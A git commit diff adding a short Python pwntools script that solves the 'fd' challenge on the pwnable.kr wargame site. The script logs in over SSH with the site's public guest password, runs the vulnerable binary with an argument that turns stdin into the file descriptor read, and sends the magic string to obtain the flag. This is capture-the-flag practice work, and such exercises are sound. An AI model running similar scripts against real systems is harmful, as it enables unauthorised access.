3d416f0d34709fb300e7c0b11cd2e2598f579a84
qhdmsgustn <qhdmsgustn@naver.com>
2021-03-03 20:15:27 +0900

    0.2

--- fd.py
+++ fd.py
@@ -1,1 +1,9 @@
-import pwntool
+from pwn import *
+ 
+shell = ssh("fd", "pwnable.kr", port=2222, password="guest")
+
+sh = shell.run('/bin/sh')
+sh.sendline("./fd 4660")
+sh.sendline("LETMEWIN")
+print(sh.recvlines(timeout=3))
+shell.close()
